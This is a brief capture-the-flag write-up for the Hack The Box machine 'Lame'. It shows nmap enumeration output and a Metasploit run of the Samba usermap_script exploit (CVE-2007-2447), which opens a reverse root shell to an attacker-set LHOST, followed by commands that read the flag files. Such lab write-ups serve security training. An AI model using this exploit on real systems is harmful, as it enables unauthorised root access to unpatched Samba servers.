# HTB: Lame — Writeup

**Difficulty:** Easy | **OS:** Linux | **IP:** 10.10.10.3

## Summary
CVE-2007-2447 in Samba 3.0.20 — username map script command injection → root shell.

## Enumeration
```bash
nmap -sV -sC -p- 10.10.10.3

# 21/tcp  open  ftp     vsftpd 2.3.4
# 22/tcp  open  ssh     OpenSSH 4.7p1
# 139/tcp open  netbios Samba 3.0.20-Debian
# 445/tcp open  netbios Samba 3.0.20-Debian
```

## Exploitation
```bash
# Metasploit
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.X
run
# → root shell
```

## Flags
```bash
cat /root/root.txt
cat /home/makis/user.txt
```
